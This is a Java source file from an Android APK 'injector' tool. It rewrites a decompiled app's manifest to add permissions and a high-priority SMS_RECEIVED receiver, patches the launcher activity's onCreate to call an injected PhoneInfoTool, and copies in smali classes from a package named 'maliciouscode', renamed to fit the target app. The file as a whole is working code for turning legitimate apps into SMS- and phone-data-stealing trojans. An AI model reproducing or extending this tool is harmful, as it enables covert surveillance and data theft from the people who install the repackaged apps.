package com.lu.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JFileChooser;
import javax.swing.filechooser.FileNameExtensionFilter;

import com.lu.java.InjectorUI;

public class FileWork {
	
	/**
	 * 选择apk文件
	 * @return
	 */
	public static List<String> openFileWindows(){
		List<String> fileInfo = new ArrayList();
		JFileChooser jFileChooser = new JFileChooser();
		FileNameExtensionFilter filter = new FileNameExtensionFilter("APK File","apk");
		jFileChooser.setFileFilter(filter);
        int i = jFileChooser.showOpenDialog(null);
        if(i== jFileChooser.APPROVE_OPTION){
            String path = jFileChooser.getSelectedFile().getAbsolutePath();
            String name = jFileChooser.getSelectedFile().getName();
            fileInfo.add(path);
            fileInfo.add(name);
            InjectorUI.informationTA.setText("");
            InjectorUI.informationTA.append("Chose file:"+path+"\n");
            InjectorUI.jlicon.setIcon(null);
            InjectorUI.apkNameJL.setText("");
            InjectorUI.apkPackageJL.setText("");
            InjectorUI.apkLaucherJL.setText("");
        }
        return fileInfo;
	}

	/**
	 * 修改AndroidManifest.xml
	 * 添加权限
	 * 注册广播
	 * @param s permissionNeededList
	 * @param path apkoutPath
	 */
	public static void fileChange(List<String> s, String path,String laucheractivity){
		String pack = laucheractivity.substring(0,laucheractivity.lastIndexOf("."));
		List<String> smsBoardcast = new ArrayList();
		smsBoardcast.add("        <receiver android:name=\""+pack+".SmsReceiver\">");
		smsBoardcast.add("            <intent-filter android:priority=\"1000\">");
		smsBoardcast.add("                <action android:name=\"android.provider.Telephony.SMS_RECEIVED\"/>");
		smsBoardcast.add("            </intent-filter>");
		smsBoardcast.add("        </receiver>");
		String newPath = path+"\\"+"tem.xml";
		File file = new File(path+"\\"+"AndroidManifest.xml");
		File fileout = new File(newPath);
		BufferedReader br;
		String read;
		int flag = 0;
		FileOutputStream fos;
        try {
        	fileout.createNewFile();
        	fos = new FileOutputStream(fileout);
        	PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(file));
			while ((read = br.readLine()) != null){

				if(flag == 0 && read.startsWith("    <uses-permission")){
					out.println(read);
		            for(int i = 0; i< s.size(); i++){
		            	out.println(s.get(i));
		            	out.flush();
		            }
		            flag = 1;
				}else if(read.contains("</application>")){
					for(int i = 0;i < smsBoardcast.size(); i++){
						out.println(smsBoardcast.get(i));
						out.flush();
					}
					out.println(read);
				}else{
					out.println(read);
				}
				
			}
			out.close();
			br.close();
			file.delete();
			fileout.renameTo(file);
			InjectorUI.informationTA.append("Adding permissions successfully...\n");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			StringWriter sw = new StringWriter();  
	        e.printStackTrace(new PrintWriter(sw, true));
	        InjectorUI.informationTA.setText(sw.toString()+"\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			StringWriter sw = new StringWriter();  
	        e.printStackTrace(new PrintWriter(sw, true));
	        InjectorUI.informationTA.setText(sw.toString()+"\n");
		} 
	}
	
	/**
	 * 修改LaucherActivity
	 * 注入代码
	 * @param s LaucherActivity
	 * @param path ApkOutPath
	 */
	public static void fileChange(String s, String path){
		//smali中包名格式
		String laucherActivityInSmali = "L"+s.replace(".", "/");
		String packageInSmali = laucherActivityInSmali.substring(0, laucherActivityInSmali.lastIndexOf("/")+1);
		
		//待注入代码
		String code = "invoke-static {p0}, "+packageInSmali+"PhoneInfoTool;->init(Landroid/content/Context;)V";
		//解析LaucherActivity绝对路径
		s = s.replace(".", "\\");
		String activityPath = path+"\\smali\\"+s+".smali";
		System.out.println(activityPath);
		//临时文件路径
		String newPath = activityPath.substring(0, activityPath.lastIndexOf("\\")+1)+"tem.smali";
		System.out.println(newPath);
		
		File file = new File(activityPath);
		File fileout = new File(newPath);
		BufferedReader br;
		String read;
		FileOutputStream fos;
        try {
        	InjectorUI.informationTA.append("Injecting code in LaucherActivity...\n");
        	fileout.createNewFile();
        	fos = new FileOutputStream(fileout);
        	PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(file));
			while ((read = br.readLine()) != null){
				out.println(read);
				if(read.indexOf("->onCreate(Landroid/os/Bundle;)V") != -1){
					out.println("\n"+code);
				}
			}
			out.close();
			br.close();
			file.delete();
			fileout.renameTo(file);
			InjectorUI.informationTA.append("Injecting code in LaucherActivity successfully...\n");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			 e.printStackTrace();
			 StringWriter sw = new StringWriter();  
	         e.printStackTrace(new PrintWriter(sw, true));
	         InjectorUI.informationTA.setText(sw.toString()+"\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			 e.printStackTrace();
			 StringWriter sw = new StringWriter();  
	         e.printStackTrace(new PrintWriter(sw, true));
	         InjectorUI.informationTA.setText(sw.toString()+"\n");
		} 
        
        
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$1.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$2.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$3.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$4.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$5.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$6.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$7.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$8.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfoTool$9.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"PhoneInfo.smali");
        classInject(packageInSmali, activityPath.substring(0, activityPath.lastIndexOf("\\")+1),"SmsReceiver.smali");
	}
	
	
	/**
	 * 修改工具代码包名
	 * 创建工具类
	 * @param packageInSmali
	 * @param path
	 */
	public static void classInject(String packageInSmali, String path, String fileName){
		String packageOfMyCode = "Lcom/lu/maliciouscode/";
		File file = new File(fileName);
		File fileout = new File(path+fileName);
		BufferedReader br;
		String read;
		FileOutputStream fos;
		try{
			InjectorUI.informationTA.append("Creating "+fileName+"...\n");
			fileout.createNewFile();
			fos = new FileOutputStream(fileout);
			PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(file));
			while ((read = br.readLine()) != null){
				if(read.indexOf(packageOfMyCode) != -1){
					read = read.replace(packageOfMyCode, packageInSmali);
				}
				out.println(read);
			}
			out.close();
			br.close();
			InjectorUI.informationTA.append("Creating"+fileName+"successfully...\n");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			StringWriter sw = new StringWriter();  
	        e.printStackTrace(new PrintWriter(sw, true));
	        InjectorUI.informationTA.setText(sw.toString()+"\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			StringWriter sw = new StringWriter();  
	        e.printStackTrace(new PrintWriter(sw, true));
	        InjectorUI.informationTA.setText(sw.toString()+"\n");
		} 
	}
}
